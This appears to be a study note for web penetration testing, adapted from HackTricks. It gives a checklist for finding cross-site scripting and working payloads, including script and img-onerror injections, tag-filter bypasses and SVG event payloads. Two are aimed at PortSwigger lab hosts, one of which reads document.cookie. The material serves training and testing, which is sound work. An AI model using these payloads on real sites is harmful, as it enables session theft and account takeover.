# Methodology  
From : [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
1. Check if any value you control (parameters, path, headers?, cookies?) is being reflected in the HTML or used by JS code.  
2. Find the context where it's reflected/used.  
3. If reflected
    1.  Check which symbols can you use and depending on that, prepare the payload:  
        1. In raw HTML:
            1. Can you create new HTML tags?
            2. Can you use events or attributes supporting `javascript:` protocol?
            3. Can you bypass protections?
            4. Is the HTML content being interpreted by any client side JS engine (AngularJS, VueJS, Mavo...), you could abuse a Client Side Template Injection.
            5. If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection?
        2.  Inside a HTML tag:  
            1. Can you exit to raw HTML context?  
            2. Can you create new events/attributes to execute JS code?
            3. Does the attribute where you are trapped support JS execution?
            4. Can you bypass protections?  
        3.  Inside JavaScript code:
            1. Can you escape the `<script>` tag?
            2. Can you escape the string and execute different JS code?
            3. Are your input in template literals ``?
            4. Can you bypass protections?  
        4.  Javascript function being executed
            1. You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If used:
    1. You could exploit a DOM XSS, pay attention how your input is controlled and if your controlled input is used by any sink.  


---
## In raw HTML
  If your input is reflected inside the value of the attribute of a tag, you need to introduce some new HTML tags designed to trigger execution of JavaScript.   
  Some useful ways of executing JavaScript are:   
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: `<img , <iframe , <svg , <script` 

In case :  


1. Reflected XSS into HTML context with most tags and attributes blocked
>BruteForce all tags by using portswigger list: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet Find out, that payload gives 200 status. Use the next payload, to send it to victim:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
2. Reflected XSS into HTML context with all tags blocked except custom ones  
>In case blocks all HTML tags except custom ones, to send it to victim:
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
3. Reflected XSS with some SVG markup allowed  
```
<svg><animatetransform onbegin=alert(1)> 
```




